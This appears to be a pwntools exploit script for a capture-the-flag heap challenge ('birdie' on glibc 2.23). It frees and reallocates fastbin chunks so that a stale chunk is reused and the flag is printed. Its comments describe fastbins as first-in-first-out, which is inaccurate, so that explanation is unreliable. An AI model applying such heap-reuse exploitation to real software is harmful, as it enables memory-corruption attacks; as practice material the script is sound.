from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.birdie'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = process([elf.path],env=env)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23/
''')

# Malloc
def birdie():
	p.sendlineafter(">", "1") 

# Free
def bogey():
	p.sendlineafter(">", "2") 

# Find flag
def flag():
	p.sendlineafter(">", "3") 


'''
At the start of the program, the heap has allocated FIVE items. 

We want the SECOND item to become the new TENTH item. 
The is fastbin so it is FIRST IN FIRST OUT. 
'''

# Get the COUNT of stored items up to 9
for i in range(5):
	birdie()

'''
Now, the fastbin is COMPLETELY empty and we want the current SECOND item
to become the new TENTH item. 

So, we will free TWO items. Because the fastbin is FIFO the SECOND item is 
now at the FRONT of the linked list. 
'''

# Bogey twice to put the SECOND item to the TOP of the fastbin
bogey()
bogey()

# With the SECOND item at the top of the fastbin, allocate it
birdie()

# Winner@!
flag()
p.interactive()
